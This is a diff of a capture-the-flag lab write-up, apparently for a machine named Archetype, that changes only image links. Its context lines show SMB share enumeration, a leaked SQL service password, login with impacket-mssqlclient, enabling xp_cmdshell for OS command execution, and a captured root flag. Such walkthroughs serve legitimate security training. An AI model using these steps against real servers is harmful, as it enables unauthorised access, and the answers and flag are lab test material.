@@ -248,7 +248,7 @@ C$              Disk      Default share
 IPC$            IPC       Remote IPC
 ```
 
-![](images/Pasted image 20260421023053.png)
+![](images/Pasted%20image%2020260421023053.png)
 
 **Q2 - What is the name of the non-administrative share available over SMB?**
 **Answer:** `backups`
@@ -276,7 +276,7 @@ smb: \> exit
 cat prod.dtsConfig
 ```
 
-![](images/Pasted image 20260421025532.png)
+![](images/Pasted%20image%2020260421025532.png)
 
 ```xml
 <DTSConfiguration>
@@ -312,7 +312,7 @@ Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
 impacket-mssqlclient ARCHETYPE/sql_svc@<TARGET_IP> -windows-auth
 ```
 
-![](images/Pasted image 20260421151124.png)
+![](images/Pasted%20image%2020260421151124.png)
 
 ```sql
 -- Check version
@@ -331,7 +331,7 @@ EXEC xp_cmdshell 'whoami';
 
 - [x] Enable `xp_cmdshell` and verify OS command execution
 
-![](images/Pasted image 20260421152907.png)
+![](images/Pasted%20image%2020260421152907.png)
 
 ```sql
 -- Enable advanced configuration options
@@ -346,7 +346,7 @@ RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
-![](images/Pasted image 20260421153444.png)
+![](images/Pasted%20image%2020260421153444.png)
 
 ```sql
 -- Review privileges for the SQL Server service context
@@ -473,7 +473,7 @@ type C:\Users\Administrator\Desktop\root.txt
 
 **Flag 2:** `b91ccec3305e98240082d4474b848528`
 
-![](images/Pasted image 20260422093616.png)
+![](images/Pasted%20image%2020260422093616.png)
 
 ---
 
